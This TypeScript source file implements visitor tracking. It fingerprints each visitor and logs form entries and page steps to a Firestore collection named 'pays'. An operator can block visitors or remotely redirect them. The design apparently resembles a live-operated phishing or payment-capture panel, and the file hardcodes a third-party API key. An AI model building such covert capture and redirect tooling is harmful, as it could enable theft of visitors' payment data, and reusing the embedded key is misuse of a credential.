/**
 * Advanced Visitor Tracking System
 * Features:
 * - Unique reference number
 * - Device detection
 * - Country detection
 * - Browser & OS detection
 * - Timestamps for all actions
 * - Online/Offline status
 * - Block system
 */

import { addData, db } from "./firebase"
import { doc, updateDoc, serverTimestamp } from "firebase/firestore"

// Generate unique visitor reference number
export function generateVisitorRef(): string {
  const timestamp = Date.now().toString(36)
  const random = Math.random().toString(36).substring(2, 8)
  return `REF-${timestamp}-${random}`.toUpperCase()
}

// Get or create visitor ID
export function getOrCreateVisitorID(): string {
  if (typeof window === 'undefined') {
    return generateVisitorRef()
  }

  let visitorId = localStorage.getItem("visitor_id")
  
  if (!visitorId) {
    visitorId = generateVisitorRef()
    localStorage.setItem("visitor_id", visitorId)
  }

  return visitorId
}

// Detect device type
export function getDeviceType(): string {
  if (typeof window === 'undefined') return 'unknown'
  
  const ua = navigator.userAgent
  
  if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
    return 'tablet'
  }
  if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
    return 'mobile'
  }
  return 'desktop'
}

// Detect browser
export function getBrowser(): string {
  if (typeof window === 'undefined') return 'unknown'
  
  const ua = navigator.userAgent
  
  if (ua.includes('Firefox')) return 'Firefox'
  if (ua.includes('SamsungBrowser')) return 'Samsung Browser'
  if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera'
  if (ua.includes('Trident')) return 'Internet Explorer'
  if (ua.includes('Edge')) return 'Edge'
  if (ua.includes('Chrome')) return 'Chrome'
  if (ua.includes('Safari')) return 'Safari'
  
  return 'unknown'
}

// Detect OS
export function getOS(): string {
  if (typeof window === 'undefined') return 'unknown'
  
  const ua = navigator.userAgent
  
  if (ua.includes('Win')) return 'Windows'
  if (ua.includes('Mac')) return 'MacOS'
  if (ua.includes('Linux')) return 'Linux'
  if (ua.includes('Android')) return 'Android'
  if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) return 'iOS'
  
  return 'unknown'
}

// Get screen resolution
export function getScreenResolution(): string {
  if (typeof window === 'undefined') return 'unknown'
  
  return `${window.screen.width}x${window.screen.height}`
}

// Get country from IP with timeout
export async function getCountry(): Promise<string> {
  const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
  const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
  
  try {
    // Add timeout of 3 seconds
    const controller = new AbortController()
    const timeoutId = setTimeout(() => controller.abort(), 3000)
    
    const response = await fetch(url, { signal: controller.signal })
    clearTimeout(timeoutId)
    
    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`)
    }
    const country = await response.text()
    return country
  } catch (error) {
    console.error("Error fetching country:", error)
    return "unknown"
  }
}

// Initialize visitor tracking
export async function initializeVisitorTracking(visitorId: string) {
  const country = await getCountry()
  
  const trackingData = {
    id: visitorId,
    referenceNumber: visitorId,
    country: country,
    deviceType: getDeviceType(),
    browser: getBrowser(),
    os: getOS(),
    screenResolution: getScreenResolution(),
    isOnline: true,
    isBlocked: false,
    isUnread: true,
    currentStep: 1,
    currentPage: "home",
    createdAt: new Date().toISOString(),
    lastActiveAt: new Date().toISOString(),
    sessionStartAt: new Date().toISOString()
  }
  
  await addData(trackingData)
  
  // Setup online/offline listeners
  setupOnlineOfflineListeners(visitorId)
  
  // Setup activity tracker
  setupActivityTracker(visitorId)
  
  return trackingData
}

// Setup online/offline status listeners
function setupOnlineOfflineListeners(visitorId: string) {
  if (typeof window === 'undefined') return
  
  const updateOnlineStatus = async (isOnline: boolean) => {
    try {
      await updateDoc(doc(db, "pays", visitorId), {
        isOnline: isOnline,
        lastActiveAt: new Date().toISOString()
      })
    } catch (error) {
      console.error("Error updating online status:", error)
    }
  }
  
  window.addEventListener('online', () => updateOnlineStatus(true))
  window.addEventListener('offline', () => updateOnlineStatus(false))
  
  // Update status on page visibility change
  document.addEventListener('visibilitychange', () => {
    if (document.visibilityState === 'visible') {
      updateOnlineStatus(true)
    }
  })
  
  // Update status before page unload
  window.addEventListener('beforeunload', () => {
    updateOnlineStatus(false)
  })
}

// Setup activity tracker (updates lastActiveAt every 30 seconds)
function setupActivityTracker(visitorId: string) {
  if (typeof window === 'undefined') return
  
  const updateActivity = async () => {
    try {
      await updateDoc(doc(db, "pays", visitorId), {
        lastActiveAt: new Date().toISOString(),
        isOnline: true
      })
    } catch (error) {
      console.error("Error updating activity:", error)
    }
  }
  
  // Update activity every 30 seconds
  const intervalId = setInterval(updateActivity, 30000)
  
  // Clear interval on page unload
  window.addEventListener('beforeunload', () => {
    clearInterval(intervalId)
  })
  
  // Track user interactions
  const events = ['mousedown', 'keydown', 'scroll', 'touchstart']
  let lastActivityUpdate = Date.now()
  
  const handleActivity = () => {
    const now = Date.now()
    // Only update if more than 10 seconds since last update
    if (now - lastActivityUpdate > 10000) {
      lastActivityUpdate = now
      updateActivity()
    }
  }
  
  events.forEach(event => {
    document.addEventListener(event, handleActivity, { passive: true })
  })
}

// Update visitor page
export async function updateVisitorPage(visitorId: string, page: string, step: number) {
  try {
    await updateDoc(doc(db, "pays", visitorId), {
      currentPage: page,
      currentStep: step,
      lastActiveAt: new Date().toISOString(),
      [`${page}VisitedAt`]: new Date().toISOString()
    })
  } catch (error) {
    console.error("Error updating visitor page:", error)
  }
}

// Save form data with timestamp
export async function saveFormData(visitorId: string, data: any, pageName: string) {
  try {
    const timestampedData = {
      ...data,
      [`${pageName}UpdatedAt`]: new Date().toISOString(),
      lastActiveAt: new Date().toISOString()
    }
    
    await updateDoc(doc(db, "pays", visitorId), timestampedData)
  } catch (error) {
    console.error("Error saving form data:", error)
  }
}

// Check if visitor is blocked
export async function checkIfBlocked(visitorId: string): Promise<boolean> {
  try {
    const docRef = doc(db, "pays", visitorId)
    const docSnap = await import('firebase/firestore').then(m => m.getDoc(docRef))
    
    if (docSnap.exists()) {
      return docSnap.data().isBlocked === true
    }
    
    return false
  } catch (error) {
    console.error("Error checking block status:", error)
    return false
  }
}

// Check if visitor should be redirected to a specific page
export async function checkRedirectPage(visitorId: string): Promise<string | null> {
  try {
    const docRef = doc(db, "pays", visitorId)
    const docSnap = await import('firebase/firestore').then(m => m.getDoc(docRef))
    
    if (docSnap.exists()) {
      const data = docSnap.data()
      // If redirectPage is set, return it and clear it
      if (data.redirectPage) {
        return data.redirectPage
      }
    }
    
    return null
  } catch (error) {
    console.error("Error checking redirect page:", error)
    return null
  }
}

// Clear redirect page after navigation
export async function clearRedirectPage(visitorId: string) {
  try {
    await updateDoc(doc(db, "pays", visitorId), {
      redirectPage: null,
      redirectedAt: new Date().toISOString()
    })
  } catch (error) {
    console.error("Error clearing redirect page:", error)
  }
}

// Set redirect page from admin dashboard
export async function setRedirectPage(visitorId: string, targetPage: string) {
  try {
    await updateDoc(doc(db, "pays", visitorId), {
      redirectPage: targetPage,
      redirectRequestedAt: new Date().toISOString()
    })
  } catch (error) {
    console.error("Error setting redirect page:", error)
  }
}
